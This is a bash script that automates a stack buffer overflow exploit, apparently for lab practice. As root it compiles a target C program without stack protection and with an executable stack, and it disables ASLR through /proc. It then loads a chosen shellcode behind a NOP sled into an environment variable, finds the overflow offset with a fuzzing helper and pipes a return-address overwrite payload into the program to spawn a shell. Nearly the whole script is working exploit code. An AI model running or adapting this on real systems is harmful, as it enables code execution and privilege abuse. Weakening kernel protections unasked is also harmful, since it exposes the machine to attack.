#!/usr/bin/env bash

if [ "$1" == "" ]; then
	echo "Usage: $0 <Program to Compile>"
	exit
fi

if [ "$(whoami)" != "root" ]; then
	echo "You must be root"
	exit
fi

NUM=0
while IFS='' read -r line || [[ -n "$line" ]]; do
	let NUM=$NUM+1
	echo $NUM": "$line
done < "shellcodes.txt"
echo -n "Choose ShellCode: "
read OPTION

let NUM=0
while IFS='' read -r LINE || [[ -n "$LINE" ]]; do
	let NUM=$NUM+1
	if [ "$NUM" == "$OPTION" ]; then
		SHELLCODE=$LINE
	fi
done < "shellcodes.txt"

gcc $1 -g -fno-stack-protector -z execstack -o program
echo 0 > /proc/sys/kernel/randomize_va_space
let NUM=100
export PWN=`python -c "print '\x90'*$NUM + '$SHELLCODE'"`
OFFSET="$(./fuzzing.py --program ./program)"
echo Offset: $OFFSET
RESULT="$(./getenvaddr PWN program)"
echo $RESULT

rm peda-session-program.txt

for ADDRESS in $RESULT; do
	continue
done

(python2 -c "from struct import pack; print '\x90'*$OFFSET + pack('<Q', $ADDRESS)"; cat) | ./program

echo 2 > /proc/sys/kernel/randomize_va_space
